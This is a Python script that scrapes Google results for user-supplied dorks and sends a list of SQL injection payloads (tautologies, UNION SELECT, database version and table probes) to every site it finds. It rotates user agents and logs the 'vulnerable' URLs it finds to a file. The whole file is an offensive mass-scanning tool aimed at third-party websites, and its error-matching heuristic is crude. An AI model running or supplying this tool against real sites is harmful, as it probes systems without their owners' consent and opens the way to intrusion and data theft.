import requests
from bs4 import BeautifulSoup
import urllib.parse
import time
import logging
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor, as_completed
import random
import argparse

# Initialize Colorama
init(autoreset=True)

# Setup logging
logging.basicConfig(filename='sql_injection_check.log', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# File to save vulnerable URLs
VULNERABLE_FILE = 'vulnerable.txt'

# User-agent list for rotation
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/90.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.64'
]

# Function to write vulnerable URLs to a file
def save_vulnerable_url(url):
    with open(VULNERABLE_FILE, 'a') as file:
        file.write(url + '\n')
    logging.info(f"Saved potentially vulnerable URL: {url}")

# Function to perform Google search and return URLs
def google_search(query, num_results=10):
    search_url = "https://www.google.com/search"
    links = []
    start = 0

    while len(links) < num_results:
        params = {'q': query, 'start': start}
        headers = {'User-Agent': random.choice(USER_AGENTS)}

        try:
            response = requests.get(search_url, params=params, headers=headers)
            response.raise_for_status()

            soup = BeautifulSoup(response.text, 'html.parser')
            for item in soup.find_all('a'):
                href = item.get('href')
                if href and href.startswith('/url?q='):
                    url = urllib.parse.unquote(href.split('/url?q=')[1].split('&')[0])
                    if url not in links:
                        links.append(url)

            if len(links) >= num_results:
                break

            start += 10  # Move to the next page of results
            time.sleep(random.uniform(2, 4))  # Respectful scraping delay

        except requests.RequestException as e:
            logging.error(f"Request failed: {e}")
            time.sleep(10)  # Delay before retrying

    return links[:num_results]

# Function to check if a URL is potentially vulnerable to SQLi
def check_sqli(url):
    sqli_test_payloads = [
        "' OR '1'='1",
        "' OR 1=1 --",
        "' OR 'x'='x",
        "' OR 1=1#",
        '" OR "1"="1',
        '" OR 1=1 --',
        "' UNION SELECT NULL--",
        "' UNION SELECT 1,2,3--",
        "' AND 1=CONVERT(int, (SELECT @@version))--",
        "' OR EXISTS(SELECT * FROM sysobjects WHERE xtype='U')--",
        "' AND (SELECT 1 FROM dual WHERE EXISTS(SELECT * FROM information_schema.tables))--",
        "' OR (SELECT 1 FROM dual WHERE LENGTH(CHAR(13)))--",
        "' OR (SELECT 1 FROM dual WHERE 1=1)--",
        "' AND 1=(SELECT COUNT(*) FROM tabname WHERE columnname LIKE '%pattern%')--",
        "' OR (SELECT * FROM users WHERE username LIKE '%admin%')--"
    ]

    headers = {'User-Agent': random.choice(USER_AGENTS)}

    for payload in sqli_test_payloads:
        test_url = f"{url}?test={urllib.parse.quote(payload)}"
        try:
            response = requests.get(test_url, headers=headers, timeout=5)

            # Check for common SQL error patterns in the response
            if any(error in response.text.lower() for error in ["error", "sql", "syntax"]):
                logging.info(f"Potential SQLi vulnerability detected at: {test_url}")
                print(Fore.GREEN + f"Potential vulnerability found: {test_url}")
                save_vulnerable_url(test_url)
                return True

        except requests.RequestException as e:
            logging.error(f"Request to {test_url} failed: {e}")

        time.sleep(random.uniform(2, 4))  # Respectful scraping delay

    print(Fore.RED + f"No vulnerability found at: {url}")
    return False

# Function to process each URL
def process_url(url):
    print(Fore.CYAN + f"Checking {url} for SQLi vulnerability...")
    if check_sqli(url):
        print(Fore.GREEN + f"Potential vulnerability found: {url}")
    else:
        print(Fore.RED + f"No vulnerability found at: {url}")

# Main function
def main():
    parser = argparse.ArgumentParser(description='SQL Injection Vulnerability Checker')
    parser.add_argument('--dorks', nargs='+', help='List of search dorks to use', required=True)
    parser.add_argument('--num_results', type=int, default=10, help='Number of search results per dork')
    args = parser.parse_args()

    num_results = args.num_results

    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = []
        for dork in args.dorks:
            print(Fore.YELLOW + f"Searching with dork: {dork}")
            urls = google_search(dork, num_results)
            
            for url in urls:
                futures.append(executor.submit(process_url, url))

        for future in as_completed(futures):
            future.result()  # Ensure exceptions are raised

if __name__ == "__main__":
    main()
